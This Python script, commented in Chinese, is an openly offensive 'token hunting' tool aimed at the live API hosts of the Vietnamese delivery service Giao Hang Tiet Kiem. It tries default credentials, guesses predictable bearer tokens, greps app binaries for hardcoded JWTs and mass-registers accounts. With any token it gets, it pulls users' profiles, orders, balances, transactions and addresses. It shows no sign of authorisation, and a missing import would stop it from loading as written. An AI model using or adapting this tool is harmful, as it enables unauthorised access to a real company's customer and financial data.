#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 GHTK Token获取与利用工具
重点：如何获取有效token并利用
"""

import requests
import json
import hashlib
import time
import base64
from typing import Dict
import urllib3
urllib3.disable_warnings()

class GHTKTokenHunter:
    """GHTK Token获取工具"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'EComShop/1.0 (Android 13)',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        
        self.base_urls = {
            'auth': 'https://auth.giaohangtietkiem.vn',
            'web': 'https://web.giaohangtietkiem.vn',
            'services': 'https://services.giaohangtietkiem.vn'
        }
        
    def analyze_token_generation(self) -> Dict:
        """分析token生成逻辑"""
        print("\n[*] 分析token生成逻辑...")
        
        # 从逆向分析推断的认证流程
        auth_flow = {
            '1_register': '/api/v3/auth/register',
            '2_login': '/api/v3/auth/access_token',
            '3_refresh': '/api/v3/auth/refresh_token',
        }
        
        return auth_flow
    
    def test_registration(self) -> Dict:
        """测试注册流程（获取token的第一步）"""
        print("\n[*] 测试注册流程...")
        
        test_phone = f"09{int(time.time()) % 100000000}"
        
        payloads = [
            {
                'phone': test_phone,
                'password': 'Test123456!',
                'device_id': 'test_device_001'
            },
            {
                'phone_number': test_phone,
                'password': 'Test123456!',
                'device_token': 'test_token'
            }
        ]
        
        for payload in payloads:
            try:
                url = self.base_urls['auth'] + '/api/v3/auth/register'
                resp = self.session.post(url, json=payload, timeout=15)
                
                print(f"  注册尝试: {resp.status_code}")
                print(f"  响应: {resp.text[:200]}")
                
                if resp.status_code in [200, 201]:
                    try:
                        data = resp.json()
                        if 'access_token' in str(data) or 'token' in str(data):
                            print(f"  ✅ 获取到token!")
                            return data
                    except:
                        pass
                        
            except Exception as e:
                pass
        
        return {}
    
    def test_default_credentials(self) -> Dict:
        """测试默认/测试凭证"""
        print("\n[*] 测试默认凭证...")
        
        test_creds = [
            {'phone': '0987654321', 'password': 'admin'},
            {'phone': '0123456789', 'password': '123456'},
            {'email': 'test@ghtk.vn', 'password': 'test123'},
            {'username': 'admin', 'password': 'admin'},
        ]
        
        login_endpoints = [
            '/api/v3/auth/access_token',
            '/api/v1/auth/login',
            '/api/auth/login'
        ]
        
        for endpoint in login_endpoints:
            for cred in test_creds:
                try:
                    url = self.base_urls['auth'] + endpoint
                    resp = self.session.post(url, json=cred, timeout=10)
                    
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if 'access_token' in str(data):
                                print(f"  ✅ 登录成功! {cred}")
                                return data
                        except:
                            pass
                except:
                    pass
        
        return {}
    
    def test_token_from_app_config(self, apk_path: str) -> List:
        """从APP配置文件中查找硬编码token"""
        print("\n[*] 在APP中查找硬编码token...")
        
        # 这个需要在服务器上运行
        import subprocess
        
        tokens = []
        
        try:
            # 搜索JWT格式token
            cmd = f'strings {apk_path}/classes*.dex | grep -E "^eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.stdout:
                tokens.extend(result.stdout.strip().split('\n'))
                print(f"  发现 {len(tokens)} 个可能的JWT token")
        except:
            pass
        
        return tokens
    
    def test_token_bruteforce(self) -> Dict:
        """测试简单的token生成规律"""
        print("\n[*] 测试token生成规律...")
        
        # 测试是否有可预测的token
        patterns = [
            base64.b64encode(b'user:123456').decode(),
            hashlib.md5(b'admin').hexdigest(),
            hashlib.sha256(b'test').hexdigest(),
        ]
        
        for token in patterns:
            try:
                url = self.base_urls['web'] + '/api/v1/profile'
                headers = {'Authorization': f'Bearer {token}'}
                resp = self.session.get(url, headers=headers, timeout=10)
                
                if resp.status_code == 200:
                    print(f"  ✅ Token有效: {token[:50]}...")
                    return {'token': token, 'response': resp.text[:200]}
            except:
                pass
        
        return {}
    
    def demonstrate_with_token(self, token: str) -> Dict:
        """演示有token后能访问什么"""
        print(f"\n[*] 演示使用token访问数据...")
        
        if not token:
            print("  ⚠️  需要有效token才能继续")
            return {}
        
        headers = {'Authorization': f'Bearer {token}'}
        
        # 尝试访问各种端点
        endpoints = [
            '/api/v1/profile',           # 个人信息
            '/api/v1/orders',            # 订单列表
            '/api/v1/orders/recent',     # 最近订单
            '/api/v1/balance',           # 余额
            '/api/v1/transactions',      # 交易记录
            '/api/v1/addresses',         # 地址簿
        ]
        
        results = {}
        
        for endpoint in endpoints:
            try:
                url = self.base_urls['web'] + endpoint
                resp = self.session.get(url, headers=headers, timeout=10)
                
                if resp.status_code == 200:
                    print(f"  ✅ {endpoint}: {len(resp.text)} bytes")
                    results[endpoint] = resp.text[:500]
            except:
                pass
        
        return results
    
    def full_token_hunt(self) -> Dict:
        """完整的token获取流程"""
        print("\n" + "="*70)
        print("🎯 GHTK Token 获取与利用")
        print("="*70)
        
        results = {
            'auth_flow': {},
            'registration': {},
            'default_creds': {},
            'hardcoded_tokens': [],
            'token_patterns': {},
        }
        
        # 1. 分析认证流程
        print("\n[1] 分析认证流程...")
        results['auth_flow'] = self.analyze_token_generation()
        
        # 2. 测试注册
        print("\n[2] 测试注册获取token...")
        results['registration'] = self.test_registration()
        
        # 3. 测试默认凭证
        print("\n[3] 测试默认凭证...")
        results['default_creds'] = self.test_default_credentials()
        
        # 4. 测试token模式
        print("\n[4] 测试token生成规律...")
        results['token_patterns'] = self.test_token_bruteforce()
        
        # 生成报告
        self._generate_report(results)
        
        return results
    
    def _generate_report(self, results: Dict):
        """生成报告"""
        print("\n" + "="*70)
        print("📊 Token获取报告")
        print("="*70)
        
        token_found = False
        
        if results['registration'].get('access_token'):
            print("\n✅ 通过注册获取token成功!")
            token_found = True
        
        if results['default_creds'].get('access_token'):
            print("\n✅ 通过默认凭证获取token成功!")
            token_found = True
        
        if results['token_patterns'].get('token'):
            print("\n✅ 发现可预测的token!")
            token_found = True
        
        if not token_found:
            print("\n❌ 未能获取有效token")
            print("\n💡 建议:")
            print("  1. 注册真实账号并抓包获取token")
            print("  2. 使用Frida Hook应用获取运行时token")
            print("  3. 逆向分析token生成算法")
        
        with open('ghtk_token_hunt_report.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[✓] 详细报告: ghtk_token_hunt_report.json")


if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║  🎯 GHTK Token 获取工具                            ║
║  目标：获取有效的访问令牌                              ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    hunter = GHTKTokenHunter()
    results = hunter.full_token_hunt()
    
    print("\n[*] Token hunt完成!")
    
    # 如果找到token，演示如何使用
    token = (results.get('registration', {}).get('access_token') or
             results.get('default_creds', {}).get('access_token') or
             results.get('token_patterns', {}).get('token'))
    
    if token:
        print("\n[*] 演示token使用...")
        hunter.demonstrate_with_token(token)
